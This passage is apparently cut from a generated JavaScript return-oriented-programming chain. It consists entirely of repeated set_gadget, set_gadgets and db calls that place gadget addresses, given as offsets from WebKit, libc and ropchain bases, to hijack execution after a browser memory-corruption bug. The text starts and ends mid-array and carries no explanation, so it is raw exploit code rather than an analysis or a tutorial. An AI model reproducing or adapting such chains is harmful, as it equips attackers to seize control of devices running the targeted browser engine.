webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+223504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+223576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+223752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+223768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+223736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+223864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+223848, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+223944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+224048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+224152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+224400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+224416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+224512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+224496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+224592, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+224696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+224712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+224800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+224872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+225048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+225064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+225160, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+225144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+225240, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+225344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+225448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+225608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+225712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+225872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+225840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+225856, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+199232, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+226064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294966272, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+226176, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+147648, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+226248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+226352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+226368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+226512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+226480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+226496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+212952, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+226704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294966272, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+226784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+226840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+226920, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([128, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+227024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+227040, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+227128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+227184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+227312, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+147648, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966268, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+227440, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+227496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+227544, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966268, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+227648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+227664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+227816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+227848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+227832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+227800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+227920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+227936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228016, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+228112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+228448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+228432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+228568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+228616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+228584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+228728, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+228720, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+228744, 
ropchain+228760, 
libc_base+811575, 
ropchain+228776, 
libc_base+811575, 
ropchain+231664, 
libc_base+788575 
]);
db([65, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+228864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+228968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+228984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+229104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+229136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+229224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+229384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+229456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+229512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+229592, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966268, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+229696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+229864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+229896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+229880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+229848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230056, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+230024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+230008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+230128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230144, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+230232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+230288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+230408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+230424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+230592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+230608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+230576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+230712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+230808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+230792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+230912, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+185976, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+230984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966268, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+231256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+231288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+231240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+231384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+231368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+231472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966268, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+231608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+227504, 
libc_base+793877, 
ropchain+231704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+231808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+231824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+231944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+231976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+231928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+232064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+232232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+232216, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+232360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232344, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+232464, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172824, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+232600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+232584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+232712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+232792, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+232944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+232960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+232928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+233120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+233240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233288, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+233256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+233400, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+233392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+233416, 
